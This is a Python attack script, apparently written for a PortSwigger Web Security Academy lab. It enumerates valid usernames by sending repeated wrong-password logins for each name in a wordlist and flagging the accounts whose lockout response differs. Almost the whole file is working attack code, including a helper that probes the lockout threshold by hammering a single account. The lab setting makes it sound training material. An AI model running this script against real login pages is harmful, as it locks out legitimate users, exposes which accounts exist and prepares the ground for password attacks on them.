#!/usr/bin/env python3
"""
Username enumeration via account-lock behavior.
Built for the PortSwigger Web Security Academy lab
"Username enumeration via account lock".

How it works:
  For each candidate username, send N failed login attempts with a
  fixed wrong password. If the username is valid, the account will
  eventually lock and the app returns a distinct "too many attempts"
  response. Invalid usernames never lock, so they keep returning the
  generic "invalid username or password" response no matter how many
  times you try. Comparing response length/status across all
  candidates highlights the outliers -> those are real usernames.

Usage:
  1. Set BASE_URL to your lab instance (https://<lab-id>.web-security-academy.net)
  2. Fill in USERNAMES with your candidate wordlist
  3. Run: python3 enumerate_lockout.py
"""

import re
import time
from collections import Counter
import sys
import urllib3


import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---- Config -----------------------------------------------------------

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "https://YOUR-LAB-ID.web-security-academy.net"
LOGIN_PATH = "/login"

USERNAMES = "usernames.txt"
WRONG_PASSWORD = "not-the-real-password-123"

# Set this to comfortably exceed the lockout threshold.
# If you don't know the threshold yet, test a single known username
# manually first (see find_lockout_threshold() below) and adjust.
ATTEMPTS_PER_USERNAME = 5

# Small delay between requests so you don't hammer the lab / get rate limited
REQUEST_DELAY_SECONDS = 0.3

# -------------------------------------------------------------------------


def get_login_page(session):
    """GET the login page, return the response (used to pick up cookies
    and any CSRF token before posting)."""
    return session.get(BASE_URL + LOGIN_PATH)


# def extract_csrf_token(html):
#     """Most PortSwigger labs embed a hidden csrf field. Adjust the regex
#     if your lab's field name differs."""
#     match = re.search(r'name="csrf"\s+value="([^"]+)"', html)
#     return match.group(1) if match else None


def attempt_login(session, username, password):
    """Perform a single login POST, refreshing CSRF token first."""
    page = get_login_page(session)
    # token = extract_csrf_token(page.text)

    data = {"username": username, "password": password}
    # if token:
    #     data["csrf"] = token

    return session.post(BASE_URL + LOGIN_PATH, data=data, allow_redirects=False)


def find_lockout_threshold(username, max_tries=10):
    """Helper: hammer ONE known username with wrong passwords and print
    each response length/status, so you can visually spot the point
    where the response changes (that's your lockout threshold)."""
    session = requests.Session()
    print(f"\nProbing lockout threshold using username: {username}")
    for i in range(1, max_tries + 1):
        resp = attempt_login(session, username, WRONG_PASSWORD)
        print(f"  attempt {i}: status={resp.status_code} len={len(resp.text)}")
        time.sleep(REQUEST_DELAY_SECONDS)


def enumerate_usernames(usernames, attempts):
    """Main enumeration: for each username, run `attempts` failed logins
    in a fresh session, and record the FINAL response (the one most
    likely to reveal lockout state)."""
    results = {}

    for username in usernames:
        session = requests.Session()
        last_resp = None

        for _ in range(attempts):
            last_resp = attempt_login(session, username, WRONG_PASSWORD)
            time.sleep(REQUEST_DELAY_SECONDS)

        results[username] = {
            "status": last_resp.status_code,
            "length": len(last_resp.text),
            "snippet": last_resp.text.strip()[:150].replace("\n", " "),
        }
        print(f"{username:20s} status={last_resp.status_code} "
              f"len={results[username]['length']}")

    return results


def report_outliers(results):
    """Most usernames will share the same response length (the generic
    'invalid username or password' page). Anything with a different
    length is worth a closer look — that's your enumerated username."""
    lengths = Counter(r["length"] for r in results.values())
    if not lengths:
        print("No results to analyze.")
        return

    baseline_length, _ = lengths.most_common(1)[0]

    print("\n--- Likely valid / locked usernames ---")
    found = False
    for username, r in results.items():
        if r["length"] != baseline_length:
            found = True
            print(f"  {username}  (status={r['status']}, len={r['length']})")
            print(f"     snippet: {r['snippet']}")
    if not found:
        print("  None found — response lengths were all identical.")
        print("  Try increasing ATTEMPTS_PER_USERNAME, or run "
              "find_lockout_threshold() on a username you suspect is valid.")


if __name__ == "__main__":
    # Optional: uncomment to first find the exact lockout threshold
    # against a username you suspect is valid, e.g. "admin"
    # find_lockout_threshold("admin", max_tries=10)

    with open(USERNAMES, "r") as f:
        usernames = [line.strip() for line in f.readlines()]

    results = enumerate_usernames(usernames, ATTEMPTS_PER_USERNAME)
    report_outliers(results)